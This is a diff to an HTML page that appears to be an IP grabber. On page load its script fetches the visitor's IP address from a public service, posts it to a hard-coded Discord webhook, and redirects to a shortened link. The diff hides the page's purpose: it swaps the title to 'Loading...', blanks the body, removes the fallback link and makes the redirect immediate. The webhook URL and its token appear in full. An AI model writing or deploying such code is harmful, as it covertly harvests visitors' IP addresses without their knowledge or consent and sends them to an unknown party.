@@ -3,12 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <title>Loading...</title>
+    <style>
+        body {
+            background-color: black;
+            margin: 0;
+            height: 100vh;
+        }
+    </style>
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX"; // Your Discord webhook
         const REDIRECT_URL = "https://is.gd/gwuu9c"; // Your redirect link
 
-        async function sendIP() {
+        async function sendIPAndRedirect() {
             try {
                 // Fetch user's IP
                 let response = await fetch("https://api64.ipify.org?format=json");
@@ -22,21 +29,18 @@
                     body: JSON.stringify({ content: `New Visitor IP: ${userIP}` })
                 });
 
-                // Redirect after 2 seconds
-                setTimeout(() => {
-                    window.location.href = REDIRECT_URL;
-                }, 2000);
             } catch (error) {
                 console.error("Error sending IP:", error);
             }
+
+            // Redirect immediately after sending request
+            window.location.href = REDIRECT_URL;
         }
 
-        // Run on page load
-        window.onload = sendIP;
+        // Run instantly when the page loads
+        window.onload = sendIPAndRedirect;
     </script>
 </head>
 <body>
-    <h1>Redirecting...</h1>
-    <p>If you are not redirected, <a href="https://is.gd/gwuu9c">click here</a>.</p>
 </body>
 </html>
